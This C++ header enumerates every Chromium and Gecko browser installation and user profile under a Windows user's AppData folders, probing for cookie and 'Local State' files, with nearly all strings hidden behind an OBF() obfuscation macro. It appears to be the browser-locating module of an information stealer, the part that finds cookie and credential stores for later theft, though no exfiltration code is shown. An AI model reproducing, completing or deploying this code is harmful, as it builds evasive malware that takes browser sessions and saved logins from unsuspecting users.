#ifndef Paths_HPP
#define Paths_HPP
#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <fstream>
#include <algorithm>
#include <queue>
#include <atomic>
#include "Models.hpp"
#include "obfusheader.h"

namespace fs = std::filesystem;

class Paths {
private:
    static bool ShouldSkipDirectory(const fs::path& path) {
        const static std::vector<std::wstring> blockedNames = {
            OBF(L"Application Data"),
            OBF(L"Temporary Internet Files"),
            OBF(L"History"),
            OBF(L"INetCache"),
            OBF(L"Steam"),
            OBF(L"GameBar"),
            OBF(L"WindowsApps"),
            OBF(L"Microsoft\\Edge\\User Data\\SwReporter"),
            OBF(L"AppData\\Local\\D3DSCache"),
            OBF(L"AppData\\Local\\Microsoft\\Windows\\INetCache")
        };

        const std::wstring pathStr = path.wstring();
        for (const auto& name : blockedNames) {
            if (pathStr.find(name) != std::wstring::npos) {
                return true;
            }
        }
        return false;
    }

    static std::wstring GetLastErrorString() {
        DWORD error = GetLastError();
        if (error == 0) return OBF(L"No error");

        wchar_t* buffer = nullptr;
        size_t size = FormatMessageW(
            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            nullptr,
            error,
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPWSTR)&buffer,
            0,
            nullptr
        );

        std::wstring message(buffer, size);
        LocalFree(buffer);
        return message;
    }

    static std::vector<fs::path> GetSpecialFolders() {
        std::vector<fs::path> roots;
        PWSTR path = nullptr;

        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &path))) {
            roots.emplace_back(path);
            CoTaskMemFree(path);
        }

        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &path))) {
            roots.emplace_back(path);
            CoTaskMemFree(path);
        }

        return roots;
    }

    static std::wstring SafeRead(const fs::path& path, const std::wstring& defaultValue) {
        try {
            if (fs::exists(path)) {
                std::wifstream file(path);
                return std::wstring((std::istreambuf_iterator<wchar_t>(file)),
                    std::istreambuf_iterator<wchar_t>());
            }
        }
        catch (...) {}
        return defaultValue;
    }

    static bool IsChromiumBrowser(const fs::path& dir) {
        return fs::exists(dir / OBF("User Data") / OBF("Local State")) ||
            (fs::exists(dir / OBF("Local State")) && fs::exists(dir / OBF("PartnerRules")));
    }

    static bool IsGeckoBrowser(const fs::path& dir) {
        if (!fs::exists(dir / "Profiles")) return false;

        bool hasIniFiles = false;
        try {
            for (const auto& entry : fs::directory_iterator(dir)) {
                if (entry.path().extension() == OBF(L".ini")) {
                    hasIniFiles = true;
                    break;
                }
            }
        }
        catch (...) {}
        return hasIniFiles;
    }

    static std::vector<fs::path> ListProfiles(const fs::path& root) {
        std::vector<fs::path> profiles;

        if (fs::exists(root / OBF("Network") / OBF("Cookies"))) {
            profiles.push_back(root);
            return profiles;
        }

        for (const auto& entry : fs::directory_iterator(root)) {
            const auto filename = entry.path().filename().wstring();
            if (filename.find(OBF(L"Profile")) != std::wstring::npos ||
                filename.find(OBF(L"Default")) != std::wstring::npos) {
                profiles.push_back(entry.path());
            }
        }
        return profiles;
    }

    static std::vector<fs::path> ListProfilesG(const fs::path& root) {
        std::vector<fs::path> profiles;
        if (fs::exists(root)) {
            for (const auto& entry : fs::directory_iterator(root)) {
                if (entry.is_directory()) {
                    profiles.push_back(entry.path());
                }
            }
        }
        return profiles;
    }

    template<typename Predicate>
    static std::vector<fs::path> ListBrowsers(const fs::path& root, Predicate&& checkBrowser) {
        std::vector<fs::path> browsers;
        std::mutex mutex;
        std::queue<fs::path> directories;
        directories.push(root);
        std::atomic<bool> processing{ true };
        std::condition_variable cv;
        std::atomic<int> active_workers{ 0 };

        auto worker = [&] {
            while (processing) {
                fs::path current;
                {
                    std::unique_lock lock(mutex);
                    cv.wait(lock, [&] { return !directories.empty() || !processing; });

                    if (!processing) break;

                    current = directories.front();
                    directories.pop();
                    active_workers++;
                }

                try {
                    bool isBrowser = checkBrowser(current);
                    if (isBrowser) {
                        std::lock_guard lock(mutex);
                        browsers.push_back(current);
                    }
                    else {
                        for (const auto& entry : fs::directory_iterator(current,
                            fs::directory_options::skip_permission_denied)) {
                            if (entry.is_directory()) {
                                const auto path = entry.path();
                                if (!ShouldSkipDirectory(path)) {
                                    std::lock_guard lock(mutex);
                                    directories.push(path);
                                    cv.notify_one();
                                }
                            }
                        }
                    }
                }
                catch (...) {}

                {
                    std::lock_guard lock(mutex);
                    active_workers--;

                    if (directories.empty() && active_workers == 0) {
                        processing = false;
                        cv.notify_all();
                    }
                }
            }
            };

        std::vector<std::thread> workers;
        const unsigned numThreads = (std::min)(4u, std::thread::hardware_concurrency());

        for (unsigned i = 0; i < numThreads; ++i) {
            workers.emplace_back(worker);
        }

        for (auto& worker : workers) {
            if (worker.joinable()) worker.join();
        }

        return browsers;
    }

    static std::wstring GetDefaultPath(const fs::path& browserRoot) {
        return L"";
    }

public:
    static std::vector<Models::Chromium> ChromiumPaths() {
        auto roots = GetSpecialFolders();
        std::vector<Models::Chromium> results;
        std::mutex mutex;

        std::vector<std::thread> workers;
        for (const auto& root : roots) {
            workers.emplace_back([&, root] {
                auto browsers = ListBrowsers(root, [](const fs::path& p) {
                    return IsChromiumBrowser(p);
                    });

                for (const auto& browser : browsers) {
                    auto browserRoot = fs::exists(browser / OBF("User Data"))
                        ? browser / OBF("User Data") : browser;

                    auto version = SafeRead(browserRoot / OBF("Last Version"), OBF(L"1.0.0.0"));
                    auto exePath = SafeRead(browserRoot / OBF("Last Browser"), OBF(L""));
                    exePath.erase(std::remove(exePath.begin(), exePath.end(), OBF(L'\0')), exePath.end());

                    if (exePath.empty()) {
                        exePath = GetDefaultPath(browserRoot);
                    }

                    auto profiles = ListProfiles(browserRoot);

                    for (const auto& profile : profiles) {
                        Models::Chromium info{
                            browser.filename().wstring(),
                            version,
                            browserRoot.wstring(),
                            exePath,
                            profile.filename().wstring(),
                            profile.wstring()
                        };

                        std::lock_guard lock(mutex);
                        results.push_back(info);
                    }
                }
                });
        }

        for (auto& worker : workers) {
            if (worker.joinable()) worker.join();
        }

        return results;
    }

    static std::vector<Models::Gecko> GeckoPaths() {
        fs::path root;
        PWSTR path = nullptr;
        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &path))) {
            root = path;
            CoTaskMemFree(path);
        }

        std::vector<Models::Gecko> results;
        std::mutex mutex;

        auto browsers = ListBrowsers(root, [](const fs::path& p) {
            return IsGeckoBrowser(p);
            });

        std::vector<std::thread> workers;
        for (const auto& browser : browsers) {
            workers.emplace_back([&, browser] {
                fs::path profilesPath = browser / OBF("Profiles");
                auto profiles = ListProfilesG(profilesPath);

                for (const auto& profile : profiles) {
                    size_t entryCount = 0;
                    bool hasFiles = false;
                    bool hasSubDirs = false;

                    try {
                        for (const auto& e : fs::directory_iterator(profile,
                            fs::directory_options::skip_permission_denied)) {
                            if (e.is_regular_file()) hasFiles = true;
                            if (e.is_directory()) hasSubDirs = true;
                            if (++entryCount > 1) break;
                        }
                    }
                    catch (...) {}

                    if (!hasFiles && !hasSubDirs) continue;
                    if (hasFiles && !hasSubDirs && entryCount == 1) continue;

                    Models::Gecko info{
                        browser.filename().wstring(),
                        L"1",
                        profile.filename().wstring(),
                        profile.wstring()
                    };

                    std::lock_guard lock(mutex);
                    results.push_back(info);
                }
                });
        }

        for (auto& worker : workers) {
            if (worker.joinable()) worker.join();
        }

        return results;
    }
};

#endif